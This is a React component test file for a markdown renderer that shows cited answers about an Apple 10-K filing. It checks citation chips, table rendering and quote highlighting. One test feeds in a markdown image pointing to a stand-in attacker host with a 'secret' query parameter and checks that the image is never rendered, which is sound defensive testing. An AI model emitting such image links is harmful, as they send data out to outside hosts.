import { fireEvent, render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";
import type { Citation } from "../api/types";
import { AnswerMarkdown, ChunkMarkdown } from "./Markdown";

const citations: Citation[] = [
  { chunk_id: "AAPL-10K-2024FY:section:00142", filing_id: "AAPL-10K-2024FY", section: "MD&A", page: 22, quote: "" },
  { chunk_id: "AAPL-10K-2024FY:section:00145", filing_id: "AAPL-10K-2024FY", section: "MD&A", page: 23, quote: "" },
];

describe("AnswerMarkdown", () => {
  it("renders markers as accessible chips that select the citation", () => {
    const onSelect = vi.fn();
    render(
      <AnswerMarkdown
        text="Net sales were **$391.0 billion** [1], Services $96.2 billion [2]."
        citations={citations}
        onSelectCitation={onSelect}
      />,
    );
    const chip = screen.getByRole("button", { name: "Source 2: AAPL 10-K FY2024, p. 23" });
    fireEvent.click(chip);
    expect(onSelect).toHaveBeenCalledWith(2);
    expect(screen.getByText("$391.0 billion").tagName).toBe("STRONG");
  });

  it("keeps chips disabled while citations are unknown", () => {
    render(<AnswerMarkdown text="Streaming [1]" streaming />);
    expect(screen.getByRole("button", { name: "Source 1" })).toBeDisabled();
  });
});

describe("remote content", () => {
  it("never renders images from answers or filing text", () => {
    const md = 'Revenue [1] ![tracker](https://evil.example/pixel.png?q=secret "t")';
    const a = render(<AnswerMarkdown text={md} citations={citations} />);
    expect(a.container.querySelector("img")).toBeNull();
    const c = render(<ChunkMarkdown text={md} quote="" />);
    expect(c.container.querySelector("img")).toBeNull();
  });
});

describe("ChunkMarkdown", () => {
  it("renders tables and highlights the quote", () => {
    const text = "Intro text.\n\n| Category | 2024 |\n| --- | ---: |\n| Services | 96,169 |\n\nTotal net sales increased 2%.";
    const { container } = render(<ChunkMarkdown text={text} quote="total NET sales increased" />);
    expect(container.querySelector("table")).not.toBeNull();
    const mark = container.querySelector("mark");
    expect(mark?.textContent).toBe("Total net sales increased");
  });

  it("falls back to no highlight when the quote is absent", () => {
    const { container } = render(<ChunkMarkdown text="Nothing here." quote="missing quote" />);
    expect(container.querySelector("mark")).toBeNull();
  });
});
